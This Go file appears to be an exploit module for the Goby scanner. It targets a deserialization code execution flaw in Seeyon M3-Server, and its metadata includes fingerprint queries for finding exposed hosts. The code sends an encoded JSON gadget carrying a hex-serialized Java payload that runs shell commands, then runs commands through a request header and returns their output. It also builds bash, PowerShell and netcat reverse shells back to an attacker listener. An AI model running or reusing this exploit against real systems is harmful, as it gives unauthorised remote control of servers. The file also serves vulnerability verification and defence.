package exploits

import (
	"encoding/base64"
	"errors"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Seeyon-M3server /mobile_portal/api/pns/message/send/batch/6_1sp1 Code Execution Vulnerability",
    "Description": "<p>Seeyon-M3server is a very practical office software. It is a revolutionary and high-end management software that can be seamlessly connected with Zhiyuan collaborative software. It helps users carry out comprehensive collaborative work and truly realize \"intelligent collaboration, control by me\". The software provides official documents, meetings, tasks, check-ins, documents, collections, sharing, behavioral performance, tasks, news, announcements, surveys, pay slips, address books, schedules and other applications to make mobile work more convenient and efficient. </p><p>SeeYon-M3server /mobile_portal/api/pns/message/send/batch/6_1sp1 has a code execution vulnerability, which the attacker can use to execute system commands, control the server, etc.</p>",
    "Product": "Seeyon-Media-Stream-Server/3.0.0",
    "Homepage": "https://www.seeyon.com/",
    "DisclosureDate": "2023-11-27",
    "PostTime": "2024-07-11",
    "Author": "Town",
    "FofaQuery": "body=\"北京致远互联软件股份有限公司\" && body=\"M3-Server\"",
    "GobyQuery": "body=\"北京致远互联软件股份有限公司\" && body=\"M3-Server\"",
    "Level": "2",
    "Impact": "<p>SeeYon-M3server /mobile_portal/api/pns/message/send/batch/6_1sp1 has a code execution vulnerability, which the attacker can use to execute system commands, control the server, etc.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, patch or upgrade to the latest version. </p><p>2. Set the access policy and whitelist access through security devices such as firewalls. </p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByBashBase64,ByBash",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "致远-M3server /mobile_portal/api/pns/message/send/batch/6_1sp1 代码执行漏洞",
            "Product": "Seeyon-Media-Stream-Server/3.0.0",
            "Description": "<p>致远-M3server是一款十分实用的办公软件，能与致远协同软件无缝连接的革命性、高端管理软件，很好的帮助用户进行全面的协同工作，真正实现\"智慧协同，掌控由我\" 。软件分别提供了公文、会议、任务、签到、文档、收藏、分享、行为绩效、任务、新闻、公告、调查、工资条、通讯录、日程等应用，让移动工作更方便高效。<br></p><p>致远-M3server&nbsp;/mobile_portal/api/pns/message/send/batch/6_1sp1 存在代码执行漏洞，，攻击者利用该漏洞可以执行系统命令，控制服务器等。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本。<br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;&nbsp;&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>致远-M3server /mobile_portal/api/pns/message/send/batch/6_1sp1 存在代码执行漏洞，，攻击者利用该漏洞可以执行系统命令，控制服务器等。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Seeyon-M3server /mobile_portal/api/pns/message/send/batch/6_1sp1 Code Execution Vulnerability",
            "Product": "Seeyon-Media-Stream-Server/3.0.0",
            "Description": "<p>Seeyon-M3server is a very practical office software. It is a revolutionary and high-end management software that can be seamlessly connected with Zhiyuan collaborative software. It helps users carry out comprehensive collaborative work and truly realize \"intelligent collaboration, control by me\". The software provides official documents, meetings, tasks, check-ins, documents, collections, sharing, behavioral performance, tasks, news, announcements, surveys, pay slips, address books, schedules and other applications to make mobile work more convenient and efficient.&nbsp;</p><p>SeeYon-M3server /mobile_portal/api/pns/message/send/batch/6_1sp1 has a code execution vulnerability, which the attacker can use to execute system commands, control the server, etc.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, patch or upgrade to the latest version.&nbsp;</p><p>2. Set the access policy and whitelist access through security devices such as firewalls.&nbsp;</p><p>3. If it is not necessary, public network access to the system is prohibited.<br></p>",
            "Impact": "<p>SeeYon-M3server /mobile_portal/api/pns/message/send/batch/6_1sp1 has a code execution vulnerability, which the attacker can use to execute system commands, control the server, etc.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10969"
}`

	/*
	  "ExpParams": [
	    {
	      "name": "attackType",
	      "type": "select",
	      "value": "cmd,reverse",
	      "show": ""
	    },
	    {
	      "name": "cmd",
	      "type": "input",
	      "value": "whoami",
	      "show": "attackType=cmd"
	    },
	    {
	      "name": "reverse",
	      "type": "select",
	      "value": "ByBashBase64,ByPowershellBase64,ByBash,ByPowershell,BySh,ByNcBsd",
	      "show": "attackType=reverse"
	    }
	  ],
	*/

	setPayloadRequest_3pISeLtxZCXoy2nfntgODWbVdBNeShdg := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用
		commandResult := ""
		getRequestConfig := httpclient.NewGetRequestConfig("/mobile_portal/api/systemLog/pns/loadLog/app.log")
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = true
		splitString := goutils.RandomHexString(16)
		getRequestConfig.Header.Store("Cmd", command+"&&"+"echo "+splitString)
		resp, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		if err != nil {
			return "", "", nil
		}
		if strings.Contains(resp.Utf8Html, splitString) {
			commandResult = strings.Split(resp.Utf8Html, splitString)[0]
		} else {
			postRequestConfig := httpclient.NewPostRequestConfig("/mobile_portal/api/pns/message/send/batch/6_1sp1")
			postRequestConfig.VerifyTls = false
			postRequestConfig.FollowRedirect = false
			//设置请求头
			postRequestConfig.Header.Store("Content-Type", "application/json")
			//设置请求体
			postRequestConfig.Data = `[{"userMessageId":"{\"@\u0074\u0079\u0070\u0065\":\"\u0063\u006f\u006d\u002e\u006d\u0063\u0068\u0061\u006e\u0067\u0065\u002e\u0076\u0032\u002e\u0063\u0033\u0070\u0030\u002e\u0057\u0072\u0061\u0070\u0070\u0065\u0072\u0043\u006f\u006e\u006e\u0065\u0063\u0074\u0069\u006f\u006e\u0050\u006f\u006f\u006c\u0044\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\",\"\u0075\u0073\u0065\u0072\u004f\u0076\u0065\u0072\u0072\u0069\u0064\u0065\u0073\u0041\u0073\u0053\u0074\u0072\u0069\u006e\u0067\":\"\u0048\u0065\u0078\u0041\u0073\u0063\u0069\u0069\u0053\u0065\u0072\u0069\u0061\u006c\u0069\u007a\u0065\u0064\u004d\u0061\u0070:aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b7870000000027372002b6f72672e6170616368652e636f6d6d6f6e732e6265616e7574696c732e4265616e436f6d70617261746f72e3a188ea7322a4480200024c000a636f6d70617261746f7271007e00014c000870726f70657274797400124c6a6176612f6c616e672f537472696e673b78707372003f6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e636f6d70617261746f72732e436f6d70617261626c65436f6d70617261746f72fbf49925b86eb13702000078707400106f757470757450726f706572746965737704000000037372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d6571007e00044c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000002757200025b42acf317f8060854e00200007870000006f4cafebabe00000034005e09003300340800350a0004003607003708003808003909001b003a08001d08003b0a003c003d0a003c003e07003f0a000c00400a001c004109001b00420800430a001b004408004508001f09001b004608004709001b00480700490a001700410a0017004a0a0017004b07004c07004d010003636d640100124c6a6176612f6c616e672f537472696e673b0100086973537461746963010003796573010004666c61670100057374617274010003282956010004436f646501000f4c696e654e756d6265725461626c6501000d537461636b4d61705461626c6507004e07003f0100063c696e69743e07004c0100097472616e73666f726d010072284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b295601000a457863657074696f6e7307004f0100a6284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b29560100083c636c696e69743e01000a536f7572636546696c6501001052756e74696d65457865632e6a6176610700500c0051001e0100012f0c005200530100106a6176612f6c616e672f537472696e670100072f62696e2f73680100022d630c001d001e0100022f430700540c005500560c005700580100136a6176612f696f2f494f457863657074696f6e0c005900230c002900230c0021001e01000b69735374617469635965730c0022002301001870696e672077786e636876796b69612e64677268332e636e0c001f001e0100035965730c0020001e0100176a6176612f6c616e672f537472696e674275696c6465720c005a005b0c005c005d010008417953516c50466b010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740100135b4c6a6176612f6c616e672f537472696e673b010039636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f5472616e736c6574457863657074696f6e01000c6a6176612f696f2f46696c65010009736570617261746f72010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010028285b4c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b01000f7072696e74537461636b5472616365010006617070656e6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e674275696c6465723b010008746f537472696e6701001428294c6a6176612f6c616e672f537472696e673b0021001b001c00000004000a001d001e0000000a001f001e0000000a0020001e0000000a0021001e0000000500090022002300010024000000990004000200000049b200011202b6000399001b06bd0004590312055359041206535905b20007534ba7001806bd0004590312085359041209535905b20007534bb8000a2ab6000b57a700084c2bb6000db10001003800400043000c0002002500000022000800000016000b0017002300190038001d004000200043001e0044001f0048002100260000000e000423fc00140700274a07002804000100290023000100240000004900020001000000132ab7000eb2000f1210b600039a0006b80011b10000000200250000001200040000002700040028000f00290012002a00260000000c0001ff0012000107002a00000001002b002c00020024000000190000000300000001b10000000100250000000600010000002d002d000000040001002e0001002b002f00020024000000190000000400000001b100000001002500000006000100000030002d000000040001002e000800300023000100240000007000020000000000371212b300071213b300141215b30016bb001759b70018b20014b60019b20016b60019b6001ab3000fb2000f1210b60003990006b80011b10000000200250000001e00070000001000050011000a0012000f002300280024003300250036002600260000000300013600010031000000020032757200025b42acf317f8060854e00200007870000001d4cafebabe00000032001b0a0003001507001707001807001901001073657269616c56657273696f6e5549440100014a01000d436f6e7374616e7456616c75650571e669ee3c6d47180100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c6501000474686973010003466f6f01000c496e6e6572436c61737365730100254c79736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324466f6f3b01000a536f7572636546696c6501000c476164676574732e6a6176610c000a000b07001a01002379736f73657269616c2f7061796c6f6164732f7574696c2f4761646765747324466f6f0100106a6176612f6c616e672f4f626a6563740100146a6176612f696f2f53657269616c697a61626c6501001f79736f73657269616c2f7061796c6f6164732f7574696c2f47616467657473002100020003000100040001001a000500060001000700000002000800010001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010000003c000e0000000c000100000005000f001200000002001300000002001400110000000a00010002001600100009707400084551505a56504a42707701007871007e000d78;\"}|","channelId":"111","title":"111","content":"222","deviceType":"androidphone","serviceProvider":"baidu","deviceFirm":"other"}]`
			//请求
			resp, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
			if err != nil {
				return "", "", nil
			}
			if !strings.Contains(resp.Utf8Html, "\"message\":\"Success\"") {
				return "", "", nil
			}
			getRequestConfig := httpclient.NewGetRequestConfig("/mobile_portal/api/systemLog/pns/loadLog/app.log")
			getRequestConfig.VerifyTls = false
			getRequestConfig.FollowRedirect = true
			splitString := goutils.RandomHexString(16)
			getRequestConfig.Header.Store("Cmd", command+"&&"+"echo "+splitString)
			resp, err = httpclient.DoHttpRequest(hostInfo, getRequestConfig)
			if err != nil {
				return "", "", nil
			}
			if strings.Contains(resp.Utf8Html, splitString) {
				commandResult = strings.Split(resp.Utf8Html, splitString)[0]
			} else {
				return "", "", nil
			}

		}

		//漏洞url地址
		url := "/mobile_portal/api/pns/message/send/batch/6_1sp1"

		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败

		return commandResult, url, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequest_3pISeLtxZCXoy2nfntgODWbVdBNeShdg

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequest_3pISeLtxZCXoy2nfntgODWbVdBNeShdg

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
